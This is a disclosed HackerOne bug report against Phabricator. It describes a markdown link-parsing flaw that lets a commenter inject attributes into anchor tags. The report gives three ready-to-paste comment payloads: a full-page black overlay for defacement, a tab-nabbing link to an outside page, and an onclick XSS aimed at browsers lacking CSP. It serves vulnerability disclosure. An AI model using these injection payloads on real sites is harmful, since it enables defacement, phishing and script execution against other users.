# Markdown parsing issue enables insertion of malicious tags

## Report Details
- **Report ID**: 758002
- **URL**: https://hackerone.com/reports/758002
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2019-12-13T18:10:00.899Z
- **Disclosed**: 2019-12-13T18:51:31.174Z

## Reporter
- **Username**: sectex
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: phabricator

## Vulnerability Information
> mongoose

By exploiting the URL markdown an attacker is able to add tags to an anchor-element.
This is less impactfull since the default csp policy blocks inline javascript execution,
but an attacker could deface individual pages, bypass the `rel="norefferrer"` tag to 
perform tab nabbing or perform XSS on browsers which don't support 
the `Content-Security-Policy`-Header (e.g. `IE 11`, `Safari 5.1.7 (Windows)`).
To exploit this vulnerability it requires an account but no other special access.

Steps To Reproduce:
---------------------
### Deface:
  * Go to any Task, Commit or similar.
  * Add a new comment:
    ```
    [ ](https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]])
    ```

### Tab nabbing:
  * Go to any Task, Commit or similar.
  * Add a new comment:
    ```
    [ ](https://sectex.dev/files/tabnabbing.html?[[/target=_blank `.`]])
    ```
  * When a user clicks the link, a new window is opened and parent window location will be changed.

### XSS (IE 11, Safari 5.1.7 (Windows)):
  * Go to any Task, Commit or similar.
  * Add a new comment:
    ```
    [ ](http://a?p=[[/onclick=alert(0) .]])
    ```
  * Click the link.

## Impact

* An attacker can perform tab nabbing, deface individual pages or perform xss.

## Attachments
No attachments
